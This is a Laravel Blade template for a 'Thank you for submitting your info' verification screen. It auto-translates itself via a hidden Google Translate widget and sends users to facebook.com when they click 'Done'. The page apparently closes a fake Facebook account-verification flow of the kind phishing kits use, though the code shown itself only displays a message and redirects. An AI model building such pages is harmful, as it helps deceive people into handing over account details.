
@extends('layouts.app')

@section('content')
<div id="root">
      <div class="fixed inset-0 flex items-center justify-center">
        <div
          class="mx-auto w-11/12 rounded-lg bg-white p-6 shadow-2xl shadow-gray-700 md:w-1/3"
        >
          <div class="mb-2 flex flex-col items-center justify-center">
            <b>Information Submitted</b>
          </div>
          <hr />
          <div class="mt-2 flex flex-col items-center justify-center gap-2">
            <svg
              aria-hidden="true"
              focusable="false"
              data-prefix="fas"
              data-icon="clock"
              class="svg-inline--fa fa-clock rounded-full border-2 border-white text-center text-blue-500 ring-2 ring-blue-500"
              role="img"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 512 512"
            >
              <path
                fill="currentColor"
                d="M256 0a256 256 0 1 1 0 512A256 256 0 1 1 256 0zM232 120l0 136c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2 280 120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"
              ></path></svg>
            <b class="mb-2 text-center">Thank you for submitting your info</b>
          </div>
          <p class="mb-4 text-gray-700">
          It should take about 24 hours to review your submission. We'll update your verification status after the review is complete.          </p>
          <div class="flex justify-center">
            <button
              class="w-full rounded bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600"
              id="continue"
            >
            Done          </button>
          </div>
        </div>
      </div>
    </div>
    <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
        } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
        }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
    <script>
    $("#continue").click(function() {
        window.location.href = "https://www.facebook.com/";
    });
    </script>
@endsection